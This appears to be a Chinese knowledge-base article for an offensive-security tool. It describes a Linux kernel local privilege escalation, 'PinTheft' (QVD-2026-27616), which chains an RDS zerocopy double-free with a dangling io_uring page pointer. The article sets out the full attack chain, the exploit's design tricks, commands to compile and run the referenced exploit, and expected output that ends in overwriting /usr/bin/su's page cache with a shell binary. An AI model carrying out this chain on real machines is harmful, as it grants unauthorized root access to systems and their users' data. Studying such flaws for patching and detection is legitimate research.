---
id: "general/01-kernel/05-pintheft-io-uring-page-cache"
title: "RDS zcopy double-free + io_uring dangling struct page*：PinTheft 内核 LPE"
title_en: "RDS zcopy Double-Free + io_uring Dangling struct page: PinTheft Kernel LPE"
summary: >
  组合 RDS zerocopy 错误路径多释放与 io_uring 的 dangling struct page*，通过偷取 FOLL_PIN 1024 引用、释放页面并让 SUID binary 重占，实现页缓存污染写入 SHELL_ELF 提权。
summary_en: >
  Chains RDS zerocopy error-path double-free with io_uring dangling struct page* to steal FOLL_PIN refcount, free and reclaim pages for a SUID binary, then poison page cache with SHELL_ELF for kernel LPE.
board: "general"
category: "01-kernel"
signals:
  - "RDS zerocopy"
  - "io_uring"
  - "page cache poisoning"
  - "double-free"
  - "FOLL_PIN"
  - "dangling pointer"
  - "privilege escalation"
mcp_tools:
  - "kb_router"
  - "workspace_write_text"
keywords:
  - "QVD-2026-27616"
  - "RDS zerocopy"
  - "io_uring"
  - "page cache"
  - "dangling pointer"
  - "kernel LPE"
  - "IORING_OP_READ_FIXED"
  - "struct page"
difficulty: "advanced"
tags:
  - "kernel-exploitation"
  - "io_uring"
  - "page-cache"
  - "LPE"
  - "RDS"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# RDS zcopy double-free + io_uring dangling struct page*：PinTheft 内核 LPE（QVD-2026-27616）

## 1. 前置条件

| 条件 | 说明 |
|------|------|
| `CONFIG_RDS` | 启用 RDS 协议族 |
| `CONFIG_RDS_TCP` | 启用 RDS over TCP（通过 `SO_RDS_TRANSPORT=2` 自动加载） |
| `CONFIG_IO_URING` | 启用 io_uring |
| `io_uring_disabled=0` | 系统未禁用 io_uring |
| 可读 SUID-root binary | `/usr/bin/su`、`/usr/bin/passwd` 等 |
| x86_64 | 当前内嵌 SHELL_ELF 是 x86_64 ELF |

注：条件基本限定在 Arch Linux 中，作者声明在其他发行版复现难度较大。

## 2. 根因：RDS zerocopy 错误路径多释放 + io_uring  dangling struct page*

### 第一层：RDS zerocopy 错误路径多释放

`rds_message_zcopy_from_user()` 逐页 pin 用户页。如果后续页面 fault，错误路径先 `put_page()` 已 pin 的页面，然后 `rds_message_purge()` 又根据残留的 `op_nents / sg entries` 再走一次 `__free_page()`。

```c
/*
 * Bug: rds_message_zcopy_from_user() pins user pages via GUP (FOLL_GET) one
 * at a time. If a later page faults, the error path put_page()s the already
 * pinned pages, then rds_message_purge() __free_page()s them again because
 * op_mmp_znotifier was NULLed but op_nents/sg entries were left intact.
 */
```

每次失败的 `sendmsg()` 从第一个页面上偷走一个引用。

### 第二层：FOLL_PIN 1024 引用偏移

`IORING_REGISTER_BUFFERS` 通过 `FOLL_PIN` 固定用户页，refcount 增加 1024（`GUP_PIN_COUNTING_BIAS`）。PoC 让 RDS 失败路径跑 1024 次，偷走全部 pin refs。

### 第三层：munmap 让页面干净释放

页面最后只剩 PTE mapping 那一个正常引用，`munmap(buf, PAGE_SIZE)` 走正常释放路径。页面干净进入 PCP，但 io_uring 的 bvec 数组仍保存着原来的 `struct page *`。

### 第四层：IORING_OP_READ_FIXED 通过 dangling 指针写入

```c
/*
 * io_uring keeps the raw struct page* in its bvec array with no liveness
 * checks. After the page is reclaimed as page cache for a suid binary,
 * READ_FIXED writes our payload into it through that dangling pointer.
 */
```

## 3. 完整攻击链

```
非特权用户
  → mmap 两页匿名内存，第二页设为 PROT_NONE guard
  → io_uring REGISTER_BUFFERS（FOLL_PIN +1024）
  → IORING_REGISTER_CLONE_BUFFERS（ring2 + daemon 持有 clone）
  → RDS MSG_ZEROCOPY sendmsg 失败 1024 次（偷走 pin refs）
  → posix_fadvise(DONTNEED) 驱逐目标 SUID binary 的 page cache
  → drain PCP + munmap(buf)（目标页释放到 PCP 顶部）
  → pread(target)（SUID binary 的 page cache 重占同一物理页）
  → IORING_OP_READ_FIXED（通过 dangling struct page* 写入 SHELL_ELF）
  → 校验 page cache 是否被污染
  → execl(target, target, (char *)NULL) → root shell
```

## 4. PoC 关键设计

| 设计点 | 作用 |
|--------|------|
| `FOLL_PIN` 1024 bias | 明确「要偷多少次」目标 |
| `PROT_NONE` guard page | 稳定触发 RDS zcopy 的后续页面 fault |
| `IORING_REGISTER_CLONE_BUFFERS` | 阻止 ring cleanup 正常 unpin 破坏重用页面 |
| daemon 持有 ring2 fd | 让 clone buffer 生命周期跨过主利用流程 |
| `sched_setaffinity(0)` | 固定 CPU，配合 PCP LIFO 提高同页重占概率 |
| PCP drain | 清理 per-CPU page list，让目标页更容易被下次分配拿到 |
| `posix_fadvise(..., DONTNEED)` | 先驱逐目标 SUID 的 page cache |
| overwrite 后再验证 | 避免直接执行未成功污染的目标 |
| `MAX_RETRIES = 5` | 页面重占失败时自动重试 |

## 5. 复现

```bash
# 检查前置条件
zgrep -E "CONFIG_RDS|CONFIG_RDS_TCP|CONFIG_IO_URING" /proc/config.gz 2>/dev/null
cat /proc/sys/kernel/io_uring_disabled 2>/dev/null

# 编译
cd "QVD-2026-27616 PinTheft/exploit"
gcc -O2 -Wall -Wextra -o exp exp.c

# 运行
./exp
```

### 预期输出

```text
[*] pinned to CPU 0
[+] found suid target: /usr/bin/su
[*] backing up /usr/bin/su → /tmp/.backup_su_<pid>
[*] stealing 1024 refcounts...
[+] page freed to top of PCP — io_uring retains dangling struct page*
[*] submitting IORING_OP_READ_FIXED to overwrite page cache...
[+] verification PASSED — page cache overwritten with SHELL_ELF
[+] executing /usr/bin/su...
```

### 清理

```bash
# 按 PoC 输出的恢复命令
sudo cp /tmp/.backup_su_<pid> /usr/bin/su && sudo chmod u+s /usr/bin/su
pkill -f "sleep 99999"
```

## Evidence

记录: 内核版本、CONFIG 检查、refcount 偷取次数、page cache 校验结果、root shell 输出

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 io_uring / RDS / page cache 信号搜索 |
| 写分析笔记 | `workspace_write_text` | 记录复现过程 |

## 参考资料

| 来源 | 链接 |
|------|------|
| 本仓库 PoC | `QVD-2026-27616 PinTheft/exploit/exp.c` |
| Linux io_uring UAPI | `include/uapi/linux/io_uring.h` |
| Linux RDS UAPI | `include/uapi/linux/rds.h` |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/QVD-2026-27616%20PinTheft |
